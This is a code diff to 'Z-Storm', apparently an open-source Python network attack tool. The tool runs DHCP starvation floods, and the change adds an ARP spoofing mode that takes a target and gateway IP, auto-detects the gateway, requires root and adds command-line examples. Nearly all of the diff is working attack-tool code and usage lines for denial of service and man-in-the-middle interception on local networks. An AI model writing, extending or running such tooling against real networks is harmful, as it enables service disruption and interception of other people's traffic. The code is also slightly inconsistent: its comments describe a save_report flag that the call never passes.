@@ -26,7 +26,6 @@ import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
 
-# --- التعديل الجديد: إضافة مكتبة netifaces للكشف التلقائي ---
 try:
     import netifaces
     NETIFACES_AVAILABLE = True
@@ -74,12 +73,10 @@ class ZStorm:
         self.interface = interface or self._auto_detect_interface()
         self.config = self._load_config(config_file)
         
-        # Initialize modules
         self.scanner = None
         self.arp_spoofer = None
         self.lab = None
         
-        # Attack settings
         self.running = False
         self.paused = False
         self.attack_mode = self.config.get('attack', {}).get('mode', 'intelligent')
@@ -114,10 +111,8 @@ class ZStorm:
         self._log_info(f"Mode: {self.attack_mode}")
         self._log_info(f"Threads: {self.thread_count}")
     
-    # --- تعديل رقم 1: دالة الكشف التلقائي المتقدمة ---
     def _auto_detect_interface(self) -> str:
-        """Auto-detect active network interface with netifaces or fallback to subprocess"""
-        # استخدام netifaces أولاً (الأدق والأسرع)
+        """Auto-detect active network interface"""
         if NETIFACES_AVAILABLE:
             try:
                 gateways = netifaces.gateways()
@@ -129,7 +124,6 @@ class ZStorm:
             except:
                 pass
         
-        # Fallback: الطريقة القديمة باستخدام subprocess
         try:
             if sys.platform == "linux":
                 result = subprocess.run(
@@ -139,14 +133,6 @@ class ZStorm:
                 for line in result.stdout.split('\n'):
                     if 'dev' in line:
                         return line.split('dev')[1].split()[0]
-            elif sys.platform == "darwin":
-                result = subprocess.run(
-                    ["route", "-n", "get", "default"],
-                    capture_output=True, text=True
-                )
-                for line in result.stdout.split('\n'):
-                    if 'interface:' in line:
-                        return line.split(':')[1].strip()
         except:
             pass
         return "eth0"
@@ -220,10 +206,8 @@ class ZStorm:
             return default_config
     
     def _setup_logging(self):
-        """Setup logging system"""
         log_file = self.config.get('logging', {}).get('file', 'dhcp_attack.log')
         log_level = self.config.get('logging', {}).get('level', 'INFO')
-        
         logging.basicConfig(
             level=getattr(logging, log_level),
             format='%(asctime)s - %(levelname)s - %(message)s',
@@ -402,12 +386,26 @@ class ZStorm:
         
         self.stats['threads_active'] -= 1
     
-    def start_attack(self, network_info: Dict = None):
-        """Start DHCP Starvation Attack"""
+    def start_attack(self, network_info: Dict = None, save_report: bool = False):
+        """Start Attack (DHCP Starvation by default, or ARP if configured)"""
         print("\n" + "="*50)
         print("⚡ Starting Z-Storm Attack")
         print("="*50)
         
+        # Check for ARP Spoofing mode
+        if self.config.get('arp_spoofing', {}).get('enabled', False):
+            print("[*] ARP Spoofing mode enabled.")
+            if self.arp_spoofer is None:
+                self.arp_spoofer = ARPSpoofer(
+                    interface=self.interface,
+                    target_ip=self.config['arp_spoofing']['target_ip'],
+                    gateway_ip=self.config['arp_spoofing']['gateway_ip'],
+                    interval=self.config['arp_spoofing']['interval']
+                )
+            self.arp_spoofer.start()
+            return
+
+        # DHCP Starvation logic
         if network_info is None and self.config.get('smart_scanner', {}).get('enabled', True):
             network_info = self.scan_network()
         
@@ -445,7 +443,8 @@ class ZStorm:
             self._log_info("Attack stopped by user")
             self.stop_attack()
         
-        self._generate_report(network_info)
+        if save_report:
+            self._generate_report(network_info)
     
     def stop_attack(self):
         """Stop the attack"""
@@ -471,7 +470,7 @@ class ZStorm:
         print(f"Rate: {self.stats['packets_per_second']:.1f} packets/s")
         print("="*50)
     
-    def _generate_report(self, network_info: Dict = None):
+    def _generate_report(self, network_info: Dict = None, report_name: str = None):
         """Generate advanced report"""
         if not self.config.get('reporting', {}).get('enabled', True):
             return
@@ -495,7 +494,11 @@ class ZStorm:
         formats = self.config.get('reporting', {}).get('formats', ['json', 'html', 'markdown'])
         
         report = AdvancedReport(attack_data, network_info)
-        files = report.generate(formats)
+        
+        if report_name:
+            files = report.generate(formats, filename=report_name)
+        else:
+            files = report.generate(formats)
         
         print("\n📁 Report files:")
         for fmt, filepath in files.items():
@@ -509,29 +512,30 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  zstorm -i eth0
-  zstorm -i eth0 --scan
-  zstorm -i eth0 -m aggressive -t 10
-  zstorm --report
+  sudo zstorm -i eth0
+  sudo zstorm -i eth0 --scan
+  sudo zstorm -i eth0 -m arp
+  sudo zstorm -i eth0 -m arp --target 192.168.1.5
+  sudo zstorm --report scan_1
         """
     )
     
     parser.add_argument("-i", "--interface", help="Network interface (auto-detected if not set)")
-    parser.add_argument("-m", "--mode", choices=['basic', 'aggressive', 'stealth', 'intelligent'],
-                       default='intelligent', help="Attack mode")
+    parser.add_argument("-m", "--mode", choices=['basic', 'aggressive', 'stealth', 'intelligent', 'arp'],
+                       default='intelligent', help="Attack mode (default: intelligent)")
     parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
     parser.add_argument("--scan", action="store_true", help="Run network scan only")
-    parser.add_argument("--report", action="store_true", help="Generate report only")
+    parser.add_argument("--report", type=str, nargs='?', const='default', help="Generate report and exit (optional name: --report scan_1)")
     parser.add_argument("-c", "--config", default="config.yaml", help="Config file")
-    
-    # --- تعديل رقم 2: إضافة خيارات الإعدادات المتقدمة ---
     parser.add_argument("--target", help="Target IP (for ARP spoofing)")
     parser.add_argument("--gateway", help="Gateway IP (auto-detected if not set)")
     
     args = parser.parse_args()
     
     if os.geteuid() != 0:
-        print("[!] Root privileges recommended")
+        print("[!] Root privileges required. Please run with sudo.")
+        print("[!] Example: sudo zstorm -i eth0")
+        sys.exit(1)
     
     if not SCAPY_AVAILABLE:
         print("[!] Scapy not installed. Run: pip install scapy")
@@ -546,24 +550,57 @@ Examples:
         config_file=args.config
     )
     
-    # --- تعديل رقم 3: تحديث الإعدادات بناءً على خيارات المستخدم ---
+    # Update settings based on user input
     if args.target:
         storm.config['arp_spoofing']['target_ip'] = args.target
     if args.gateway:
         storm.config['arp_spoofing']['gateway_ip'] = args.gateway
     
+    # Handling Scanning
     if args.scan:
         storm.scan_network()
         sys.exit(0)
     
+    # Handling Report generation (No attack)
     if args.report:
-        storm._generate_report()
+        # If a specific report name is given, use it
+        report_name = args.report if args.report != "default" else None
+        storm._generate_report(report_name=report_name)
         sys.exit(0)
     
+    # Set attack mode
     storm.attack_mode = args.mode
     storm.thread_count = args.threads
     
+    # If ARP mode is selected, enable it in config
+    if args.mode == "arp":
+        # If target not provided, try to auto-detect or prompt
+        if not storm.config['arp_spoofing']['target_ip']:
+            print("\n[!] Target IP not specified with --target.")
+            target_input = input("[?] Enter Target IP manually: ")
+            storm.config['arp_spoofing']['target_ip'] = target_input
+        
+        if not storm.config['arp_spoofing']['gateway_ip']:
+            print("[*] Gateway not specified. Auto-detecting...")
+            try:
+                gateways = netifaces.gateways()
+                if netifaces.AF_INET in gateways:
+                    gw = gateways[netifaces.AF_INET][0][0]
+                    storm.config['arp_spoofing']['gateway_ip'] = gw
+                    print(f"[*] Auto-detected Gateway: {gw}")
+                else:
+                    print("[!] Could not auto-detect gateway. Please specify with --gateway.")
+                    sys.exit(1)
+            except:
+                print("[!] Could not auto-detect gateway. Please specify with --gateway.")
+                sys.exit(1)
+        
+        storm.config['arp_spoofing']['enabled'] = True
+        print(f"[*] ARP Spoofing configured: Target={storm.config['arp_spoofing']['target_ip']}, Gateway={storm.config['arp_spoofing']['gateway_ip']}")
+    
     try:
+        # Only generate report if --report was specified (Use args.report to check)
+        # We pass save_report=True only if --report was provided when starting attack
         storm.start_attack()
     except KeyboardInterrupt:
         print("\n[!] Interrupted")
